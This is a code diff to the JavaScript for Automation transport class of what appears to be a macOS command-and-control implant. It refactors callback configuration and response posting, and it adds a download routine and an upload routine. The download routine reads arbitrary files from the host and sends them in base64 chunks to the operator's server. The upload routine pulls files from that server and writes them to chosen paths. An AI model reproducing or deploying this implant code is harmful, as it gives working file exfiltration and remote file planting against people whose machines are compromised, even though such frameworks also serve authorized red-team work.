@@ -2,15 +2,19 @@
 class customC2 extends baseC2{
 	constructor(interval, baseurl){
 		super(interval, baseurl);
+		this.commands = [];
 	}
 	getConfig(){
 		//A RESTful base config consists of the following:
 		//  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
-		return {'baseurl': this.baseurl, 'interval': this.interval, 'killdate': ''};
+		return JSON.stringify({'baseurl': this.baseurl, 'interval': this.interval, 'killdate': '', 'commands': this.commands.join(",")});
 	}
-	setConfig(baseurl, interval, killdate){
+	setConfig(params){
 		//A RESTful base config has 3 updatable components
 		//  BaseURL (includes Port), CallbackInterval, and KillDate (not implemented yet)
+		if(params['commands'] != undefined){
+		    this.commands = params['commands'];
+		}
 	}
 	checkin(ip, pid, user, host){
 		//get info about system to check in initially
@@ -31,15 +35,18 @@ class customC2 extends baseC2{
 		        return JSON.parse(task);
 		    }
 		    catch(error){
-		        $.NSThread.sleepForTimeInterval(C2.interval);  // don't spin out crazy if the connection fails
+		        $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
 		    }
 		}
 
 	}
-	postResponse(urlEnding, data){
+	postResponse(task, output){
+	    // this will get the task object and the response output
+	    return this.postRESTResponse("api/v1.0/responses/" + task.id, output);
+	}
+	postRESTResponse(urlEnding, data){
 		//depending on the amount of data we're sending, we might need to chunk it
-		//  current chunks at 5kB, but we can change that later
-		var size= 512000; //5000;
+		var size= 512000;
 		var offset = 0;
 		//console.log("total response size: " + data.length);
 		do{
@@ -50,22 +57,6 @@ class customC2 extends baseC2{
 		    var postData = {"response": encodedChunk};
 		    var jsondata = this.htmlPostData(urlEnding, JSON.stringify(postData));
 		}while(offset < data.length);
-		/*
-		for(var i = 0; i < data.length; i+=size){
-			//console.log(i);
-			var chunk = data.substring(i,i+size);
-			//console.log(chunk);
-			//base64 encode each chunk before we send it
-			var chunk_nsstring = $.NSString.alloc.initWithCStringEncoding(chunk, $.NSData.NSUnicodeStringEncoding);
-			//console.log(chunk_nsstring);
-			var data_chunk = chunk_nsstring.dataUsingEncoding($.NSData.NSUTF16StringEncoding);
-			//console.log(data_chunk);
-			var encoded_chunk = data_chunk.base64EncodedStringWithOptions(0).js;
-			//console.log(encoded_chunk);
-			var post_data = {"response":encoded_chunk};
-			var jsondata = this.htmlPostData(urlEnding, JSON.stringify(post_data));
-			//console.log("returned data: " + JSON.stringify(jsondata));
-		}*/
 
 		return jsondata;
 	}
@@ -91,7 +82,7 @@ class customC2 extends baseC2{
 				return jsondata;
 			}
 			catch(error){
-			    $.NSThread.sleepForTimeInterval(C2.interval);  // don't spin out crazy if the connection fails
+			    $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
 			}
 		}
 	}
@@ -102,9 +93,67 @@ class customC2 extends baseC2{
 	            return data;
 	        }
 	        catch(error){
-	            $.NSThread.sleepForTimeInterval(C2.interval); //wait timeout seconds and try again
+	            $.NSThread.sleepForTimeInterval(this.interval); //wait timeout seconds and try again
 	        }
 	    }
 	}
+	download(task, params){
+        // download just has one parameter of the path of the file to download
+        if( does_file_exist(params)){
+            var offset = 0;
+            var chunkSize = 512000; //3500;
+            var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
+            // Get the file size by seeking;
+            var fileSize = handle.seekToEndOfFile;
+            // always round up to account for chunks that are < chunksize;
+            var numOfChunks = Math.ceil(fileSize / chunkSize);
+            var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
+            var registerData = convert_to_nsdata(registerData);
+            var registerFile = this.postResponse(task, registerData);
+            console.log("did the call to postresponse");
+            if (registerFile['status'] == "success"){
+                handle.seekToFileOffset(0);
+                var currentChunk = 1;
+                var data = handle.readDataOfLength(chunkSize);
+                while(parseInt(data.length) > 0 && offset < fileSize){
+                    // send a chunk
+                    var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['id']});
+                    fileData = convert_to_nsdata(fileData);
+                    this.postResponse(task, fileData);
+                    $.NSThread.sleepForTimeInterval(this.interval);
+
+                    // increment the offset and seek to the amount of data read from the file
+                    offset += parseInt(data.length);
+                    handle.seekToFileOffset(offset);
+                    currentChunk += 1;
+                    data = handle.readDataOfLength(chunkSize);
+                }
+                var output = "Finished downloading file with id: " + registerFile['id'];
+                output += "\nBrowse to /api/v1.0/files/" + registerFile['id'];
+            }
+            else{
+               var output = "Failed to register file to download";
+            }
+        }
+        else{
+            var output = "file does not exist";
+        }
+        return output;
+	}
+	upload(task, params){
+	    try{
+	        var split_params = params.split(" ");
+            var url = "api/v1.0/files/" + split_params[0];
+            var file_data = this.htmlGetData(this.baseurl + url);
+            var file_path = split_params.slice(1, ).join(" ");
+            var decoded_data = $.NSData.alloc.initWithBase64Encoding($(file_data));
+            var file_data = $.NSString.alloc.initWithDataEncoding(decoded_data, $.NSUTF8StringEncoding).js;
+            output = write_data_to_file(decoded_data, file_path);
+            return output;
+	    }catch(error){
+	        return error.toString();
+	    }
+
+	}
 }
-//------------- INSTANTIATE OUR C2 CLASS HERE -----------------------
+//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
